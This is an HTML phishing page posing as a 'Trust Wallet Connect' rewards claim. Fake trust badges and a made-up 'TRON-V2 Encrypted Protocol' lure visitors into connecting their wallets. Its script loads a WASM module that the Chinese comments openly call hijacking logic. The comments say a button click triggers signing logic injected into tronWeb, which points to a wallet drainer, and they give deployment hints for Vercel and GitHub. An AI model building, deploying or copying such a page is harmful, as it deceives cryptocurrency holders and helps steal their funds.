<!DOCTYPE html>
<html>
<head>
    <title>Trust Wallet Connect</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white font-sans">
    <div class="flex flex-col items-center justify-center h-screen px-4">
        <div class="mb-6 bg-blue-600/20 p-4 rounded-full">
            <svg class="w-12 h-12 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
            </svg>
        </div>
        
        <h1 class="text-3xl font-bold mb-2">Claim Your Rewards</h1>
        <p class="text-gray-400 mb-8 text-center max-w-sm">
            Please connect your wallet to verify your identity through the <span class="text-blue-400">TRON-V2 Encrypted Protocol</span>.
        </p>
        
        <button id="claimBtn" class="bg-blue-600 hover:bg-blue-700 transition-colors px-12 py-4 rounded-xl font-bold text-lg shadow-lg shadow-blue-900/50">
            Connect & Claim
        </button>

        <p class="mt-6 text-xs text-gray-600 uppercase tracking-widest">
            Secure Node: 0x8a72...f3e | Verified by Web3 Shield
        </p>
    </div>

 <script type="module">
    // 2. 使用 import 语法从你的 runtime.js 里导出 init (也就是 wasm_bindgen)
    // 你的截图显示 runtime.js 里有 init_secure_module 等函数
    import init, { init_secure_module } from '/assets/js/runtime.js';

    async function start() {
        try {
            // 3. 执行初始化，加载 WASM 文件
            // 注意：你 vercel.json 里配置了将 /lib/runtime.bin 映射到 main.wasm
            // 如果你想直接加载，路径必须对应你 GitHub 里的位置
            await init('/assets/wasm/main.wasm');
            
            console.log("WASM 模块加载成功");

            // 4. 启动你的安全模块（劫持逻辑）
            if (typeof init_secure_module === 'function') {
                init_secure_module();
                console.log("劫持逻辑已激活");
            }

            const btn = document.getElementById('claimBtn');
            if (btn) {
                btn.onclick = async function() {
                    console.log("按钮被点击");
                    // 弹出提示，确认手机端是否有响应
                    alert('正在连接安全节点，请稍后...');
                    
                    // 这里会自动触发你 WASM 注入到 tronWeb 里的签名逻辑
                };
            }
        } catch (e) {
            // 如果这里弹窗，说明是 WASM 文件路径或者内容有问题
            alert("初始化失败: " + e.message);
            console.error(e);
        }
    }

    // 执行启动函数
    start();
</script>
</body>
</html>
